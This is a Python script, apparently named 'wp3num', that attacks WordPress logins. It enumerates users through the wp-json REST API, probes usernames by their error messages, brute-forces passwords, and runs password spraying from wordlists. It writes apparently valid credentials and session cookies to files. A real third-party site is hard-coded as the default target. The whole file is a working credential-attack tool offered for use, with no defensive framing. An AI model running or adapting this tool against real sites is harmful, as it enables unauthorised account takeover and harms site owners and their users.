import requests
import time, sys
#Finding pages where my headers are reflected
#http://127.0.0.1/wordpress/wp-json/wp/v2/users/2 - has to return json data2be sure it works
#make educated username gueses by searching for authors on the site ... 
#generic bruteforcer
USER_CHOICE = 2
USERNAME_WORDLIST = 'user-wordlist.txt'
PASSWORD_WORDLIST = "pass-wordlist.txt"
WP_LOGIN_PATH = "/wp-login.php"
ERROR_MSG = "Unknown username"
TARGET_URL = "https://community.teespring.com/"
HEADERS = {'Accept': 'text/html application/xhtml+xml, application/xml; q=0.9, */*; q=0.8',
'Accept-Encoding': 'gzip deflate',
'Accept-Language': 'en-US',
'Cache-Control': 'max-age=0',
'Connection': 'Keep-Alive',
'Cookie': 'wordpress_test_cookie=bruteforce',
'Host': '127.0.0.1',
'Referer': 'randstr',
'Upgrade-Insecure-Requests': '1',
'User-Agent': 'Mozilla Windows Apple Gecko Chrome Safari Edge'}

def sleep (secs):
    time.sleep(secs)


def tools_request (string="", both=True):
    if both == True:
        username_list = input(f"\nPlease pass me {string} to enumerate agaisnt ... \n <<>> ")
        password_list = input("\n oh, ... and location to a good ol' fashioned password wordlist! ... lets get cracking!! \n <<>> ")
        return username_list, password_list
    if both == 'useronly':
        username_list = input(f"\nPlease pass me {string} to enumerate agaisnt ... \n <<>> ")
        return username_list
    if both == 'passonly':
        password_list = input("\n oh, ... ah need location to a good ol' fashioned password wordlist! ... lets get cracking!! \n <<>> ")
        return password_list


def enum_wp_json():

    print(f"[+] Trying out [wp-json enum] using [-] {TARGET_URL}/wp-json/wp/v2/users/ [-]")
    try:
        req = requests.get(f"{TARGET_URL}/wp-json/wp/v2/users/", allow_redirects=False)
    except Exception:
        print("\n[+] I don't know what ... but something's definitely wrong with your internet conneection\n\n[+] try again mate ... ")
        exit(1)
    if req.status_code == 404:
        print("[+] Target doesn't appear to be vulnerable to [wp-json enum]")
    if req.status_code == 200 and (('id' and 'name') in req.content.decode()):
        print("[+] ... Target appears vulnerable ... ")
        sleep(2)
        print("[+] ... xTaRtInG eNuMeRaTiOn ... ")
        sleep(2)
        print("[+] ... eNuMeRaTiNg UsErS ... ")
        sleep(3)
        print("==========================Hopefully this is what your'e looking! for==========================\n")
        print(req.json())
    USER_CHOICE = input("\n==============================Should i [1]quit or [2]continue ?===============================\n <<>> ")
    if int(USER_CHOICE) == 1:
        return 1
    elif int(USER_CHOICE) == 2:
        sleep(2)
        return 2


def author_crawler_test ():
    print("COMING SOON!!!!")
    pass


def username_bruteforce_enumeration (username_wordlist, chunk=1000, ERROR_MSG="Unknown username"):
    
    print(f"[+] ... initializing username enumeration ... ")
    file_descriptor = open(f'{username_wordlist}', 'rb')
    password = 'dumb-value'
    empty_string_count = 0
    sleep(1)
    print("[+] ... starting eNuMeRaTiOn ...  ")
    sleep(2)
    while True:
        username_list = [file_descriptor.readline().decode().strip() for line in range(chunk)]
        empty_string_count = 0
        for username in username_list:
            if not username:
                empty_string_count += 1
                if empty_string_count > 5:
                    print("====== [Possible EndOfFile reached!!!] ======\n"*5)
                    break
                continue
            req = requests.post(f"{TARGET_URL}{WP_LOGIN_PATH.lstrip('/')}", headers=HEADERS, data=dict(log=username, pwd=password), allow_redirects=False)
            if ERROR_MSG in req.content.decode():
                print(f"[+] [ {username} : {password} ] ... ... FAILED!!! ... username probably wrong")
                continue
            elif username in req.content.decode():
                with open('_wp3num_userEnum.txt', 'a') as f_des: f_des.write(f"[Possible Cred] {username}\n")
                print(f" [+] =============[Possible valid cred] {username}   ...   dumped to '_wp3num_userEnum.txt' =============\n [+] ============= eNuMeRaTiOn CoNtInUa!!! ... =============")
        if empty_string_count > 5:
            break
    print(f"[+] Wordlist {username_wordlist} exhausted\n") 
    USER_CHOICE = input("Paste new wordlist location to continue username enumeration! OR [enter] to go back \n <<>> ")
    if not USER_CHOICE:
        USER_CHOICE = 0
        return
    else:
        print("[+] Am assuming what you typed is a wordlist location ...  \n...\n   ...\n      ...\n\n")
        username_bruteforce_enumeration(USER_CHOICE)


def password_bruteforce (username, wordlist, VERBOSE=1, COUNT=0, ERROR_MSG="incorrect"):

    print(f"[+] ... initializing password bruteforcing! ... ")
    sleep(2)
    print("[+] ... commencing bRuTeFoRcE!!!! ...  ")
    sleep(1)
    with open(f"{wordlist}", 'rb') as FD:
        while True:
            password = FD.readline().decode().strip()
            if not password:
                break
            req = requests.post(f"{TARGET_URL}{WP_LOGIN_PATH.lstrip('/')}", headers=HEADERS, data=dict(log=username, pwd=password), allow_redirects=False)
            if ERROR_MSG in req.content.decode() and VERBOSE == 1:
                print(f"[+] [ {username} : {password} ] ... ... FAILED!!! ... username probably wrong")
                continue
            print("==============================================================am running ... ======================================================")
            if req.status_code == 302:
                with open('_302_.txt', 'a') as file_des:
                    file_des.write("<<<<<<<<<<<<<< " + req.headers['Location'] + " >>>>>>>>>>>>>\n\n" + requests.get(req.headers['Location']).content.decode() + "\n\n===========CREDS===========\n" + username + ":" + password + "\n\n========================COOKIES=======================\n")
                    file_des.write(str(list(req.cookies)))
                    print("[+] Redirect Ignored [Possible valid creds]... Current creds and Cookies dumped to '_302_.txt' \n[+] eNuMeRaTiOn CoNtInUa!!! ... ")
            COUNT += 1
    print(f"[+] Wordlist {wordlist} exhausted\n") 
    USER_CHOICE = input("Paste new wordlist location to continue bruting! OR [space] to go back \n <<>> ")
    if USER_CHOICE == ' ':
        USER_CHOICE = 0
        return
    else:
        print("[+] Am assuming what you typed is a wordlist location ...  \n...\n   ...\n      ...")
        password_bruteforce(username, USER_CHOICE)


def username_generator(file_DES):
    yield [file_DES.readline().strip() for x in range(8)]

def password_spraying (username_wordlist, password_wordlist, TIMER=time.time(), COUNT=0, ERROR_MSG="Unknown username"):

    print(f"[+] ... initializing pAsSwOrD sPrAyInG!!! ... ")
    fd = open(f'{password_wordlist}', 'rb')
    sleep(2)
    print("[+] ... cOmMeNcInG pAsSwOrD sPrAyInG!!! ...  ")
    sleep(1)
    while True:
        password = fd.readline().decode().strip()
        if not password:
            break
        username_generator_FD = open(username_wordlist, 'r')
        username_list = username_generator(username_generator_FD)
        while True:
            username_list = next(username_generator(username_generator_FD))
            empty_string_count = 0
            for users_name in username_list:
                if not users_name:
                    empty_string_count += 1
                    if empty_string_count > 5: 
                        print("======================================\n")
                        break
                    continue
                req = requests.post(f"{TARGET_URL}{WP_LOGIN_PATH}", headers=HEADERS, data=dict(log=users_name, pwd=password), allow_redirects=False)
                if ERROR_MSG in req.content.decode() or "incorrect" in req.content.decode():
                    print(f"[+] [ {users_name} : {password} ] ... ... FAILED!!!")
                    continue
                if req.status_code == 302:
                    with open('_302_.txt', 'a') as file_des:
                        file_des.write("<<<<<<<<<<<<<< " + req.headers['Location'] + " >>>>>>>>>>>>>\n\n" + requests.get(req.headers['Location']).content.decode() + "\n\n===========CREDS===========\n" + users_name + ":" + password + "\n\n========================COOKIES=======================\n")
                        file_des.write(str(list(req.cookies)))
                    print("[+] =============== Redirect Ignored [Possible valid creds]... Current creds and Cookies dumped to '_302_.txt' ")
            if empty_string_count > 5:
                username_generator_FD.close()
                break


def auto_magic_run ():
    print("Lets start out with the [wp-json] issue!\n")
    sleep(1)
    print("...")
    ret_val = enum_wp_json()
    if ret_val == 2:
        print("[+] Moving on to Author crawler test ... ")
        author_crawler_test()
        print("[+] ... Thanks for using wp3num ... ... ... \n ... ")
    return


def manual_run ():
    global PASSWORD_WORDLIST, USERNAME_WORDLIST
    while True:
        USER_CHOICE = input(" [1] wp-json/users test \n [3] [wp3num] intelligent crawler test (COMING! SOON!!) \n [5] Username enumeration (only!!!!) \n [7] Login Username:Password bruteforce! \n [9] Login password spraying! \n [space] Go back! \n <<>> ")
        if USER_CHOICE == ' ':
            USER_CHOICE = 0
            return
        # if int(USER_CHOICE) == 1:
        #     enum_wp_json()
        if int(USER_CHOICE) == 3:
            author_crawler_test()

        if int(USER_CHOICE) == 5:
            if USERNAME_WORDLIST: # checks if its empty
                USER_CHOICE = input(f"Use existing USERNAME wordlist location [{USERNAME_WORDLIST}] [y|yes OR n|no]\n <<>> ") # user choooses to use/change wordlist
            if USER_CHOICE.lower() == 'y' or USER_CHOICE.lower() == 'yes':
                username_bruteforce_enumeration(USERNAME_WORDLIST)
            if USER_CHOICE.lower() == 'n' or USER_CHOICE.lower() == 'no':
                USERNAME_WORDLIST = tools_request("the location to a USERNAME wordlist", 'useronly')
                username_bruteforce_enumeration(USERNAME_WORDLIST)

        if int(USER_CHOICE) == 7:
            USER_CHOICE = int(input("[+] Verbose output ... [1]yes[default] OR [0]no \n <<>> "))
            SINGLE_USER = tools_request('a [SINGLE!!!] username', both='useronly')
            if PASSWORD_WORDLIST: # checks if its empty
                USER_CHOICE2 = input(f"Use existing PASSWORD wordlist location [{PASSWORD_WORDLIST}] [y|yes OR n|no]\n <<>> ")
            if USER_CHOICE2.lower() == 'n' or USER_CHOICE2.lower() == 'no':
                PASSWORD_WORDLIST = tools_request(both='passonly')
                password_bruteforce(SINGLE_USER, PASSWORD_WORDLIST, VERBOSE=USER_CHOICE) #sends only one username to bruteforce function as a string
            if USER_CHOICE2.lower() == 'y' or USER_CHOICE2.lower() == 'yes':
                password_bruteforce(SINGLE_USER, PASSWORD_WORDLIST, VERBOSE=USER_CHOICE)

        if int(USER_CHOICE) == 9:
            if USERNAME_WORDLIST: # checks if its empty
                USER_CHOICE = input(f"Use existing USERNAME wordlist location [{USERNAME_WORDLIST}] [y|yes OR n|no]\n <<>> ") # user choooses to use/change wordlist
            if PASSWORD_WORDLIST: # checks if its empty
                USER_CHOICE2 = input(f"Use existing PASSWORD wordlist location [{PASSWORD_WORDLIST}] [y|yes OR n|no]\n <<>> ")
            
            if (USER_CHOICE in ["y", "yes", "YES", "Y"] and USER_CHOICE2 in ["y", "yes", "YES", "Y"]):
                password_spraying(USERNAME_WORDLIST, PASSWORD_WORDLIST)
            
            if (USER_CHOICE in ["y", "yes", "YES", "Y"] and USER_CHOICE2 in ["n", "no", "NO", "N"]):
                PASSWORD_WORDLIST = tools_request(both='passonly')
                password_spraying(USERNAME_WORDLIST, PASSWORD_WORDLIST) # sends the spraying function wordlist files.
            
            if (USER_CHOICE in ["n", "no", "NO", "N"] and USER_CHOICE2 in ["y", "yes", "YES", "Y"]):
                USERNAME_WORDLIST = tools_request("the location to a USERNAME wordlist", both='useronly')
            
            if (USER_CHOICE in ["n", "no", "NO", "N"] and USER_CHOICE2 in ["n", "no", "NO", "N"]):
                USERNAME_WORDLIST, PASSWORD_WORDLIST = tools_request("the location to a USERNAME wordlist", True)
                password_spraying(USERNAME_WORDLIST, PASSWORD_WORDLIST)
            

if __name__ == "__main__":

    print("""
                                                         ____                              
                                                        |___ \                             
                                     __      __  _ __     __) |  _ __    _   _   _ __ ___  
                                     \ \ /\ / / | '_ \   |__ <  | '_ \  | | | | | '_ ` _ \ 
                                      \ V  V /  | |_) |  ___) | | | | | | |_| | | | | | | |
                                       \_/\_/   | .__/  |____/  |_| |_|  \__,_| |_| |_| |_|
                                                | |                                        
                                                |_|                                        
                                               ... xCrIpT bY [70RP3D0] aka [F34R_0x00] ... 
        """)


    COUNT = 0
    try:
        TARGET_URL = sys.argv[1].strip()
    except IndexError:
        print("[+] Url not provided! ... REQUIRED! in format e.g wpbrut3r.py http(s)://www.example.com/{leave_blank|wordpress_root_directory} \n[+] eXiTiNg ... ")
        exit(1)

    temp_path_choice = input(f"[+] Provide login path or press enter to use default {WP_LOGIN_PATH} :")
    if temp_path_choice:
        WP_LOGIN_PATH = temp_path_choice
        print(f"\n Using {TARGET_URL}{WP_LOGIN_PATH} as wordpress login path ... \n\n")

    while True:
        try:
            print("\n \t\tHEY!! ... WELCOME! ... AND THANKS FOR USING ... [wp3num] ...\n\n")
            USER_CHOICE = input("""
                [1] Run [wp3num] in [4u70m4g!c] mode \n\n
                [2] Run [wp3num] in [M4nUa1] mode \n\n
                [space] QUIT!! nOw!!! \n\n
                 <<>> """)
            COUNT += 1

            if USER_CHOICE == ' ':
                USER_CHOICE = 0
                print("[+] cleaning up ... \n")
                sleep(1.5)
                print("[+] Thanks for using wp3num ... ... ... \n ... eXiTiNg GaCeFuLlY!! ah ah ah!...\n")
                sleep(1.5)
                exit()

            if COUNT > 1:

                TARGET_URL_CHOICE = input(f"[+] Press enter to continue with -> {TARGET_URL} or provide new url :")
                if not TARGET_URL_CHOICE:
                    pass
                else:
                    TARGET_URL = TARGET_URL_CHOICE

            if int(USER_CHOICE) == 1: # AUTOMATIC RUN
                print("[+] Nice! choice!! ... lEt Me WoRk My mAgIc!! ... ")
                sleep(2)
                auto_magic_run()

            elif int(USER_CHOICE) == 2: # MANUAL RUN
                print("[+] Yea! that's right!! ... take charge!! ... leggo!!")
                sleep(2)
                manual_run()
        except KeyboardInterrupt:
            if COUNT > 0:
                print("[+] cleaning up ... ")
                sleep(1.5)
                print("[+] Thanks for using wp3num ... ... ... \n ... eXiTiNg GaCeFuLlY!! ah ah ah!...")
                exit()
            else:
                print("[+] cleaning up ... ")
                sleep(0.5)
                print("[+] Going back to main menu\n\n")
            COUNT += 1


# file='file1.txt'
# def usergen(FF):
#     yield [FF.readline().decode().strip() for x in range(10)]

# def func(location):
#     while True:
#         USERNAME_WORDLIST = open(location, 'rb')
#         gen = usergen(USERNAME_WORDLIST)
#         COUNT = 0
#         while True:
#             gen = next(usergen(USERNAME_WORDLIST))
#             print("=============================================================================================================")
#             print("ITERATION")
#             empty_string_count = 0
#             for val in gen:
#                 if not val:
#                     empty_string_count += 1
#                     if empty_string_count > 5: 
#                         print("====== [Possible EndOfFile reached!!!] ======\n"*5)
#                         break
#                     continue
#                 print(f"VALUE {COUNT} ::: {val}")
#                 COUNT += 1
#             if empty_string_count > 5:
#                 USERNAME_WORDLIST.close()
#                 print("CLOSED and EXIT")
#                 exit()
# func(file)
#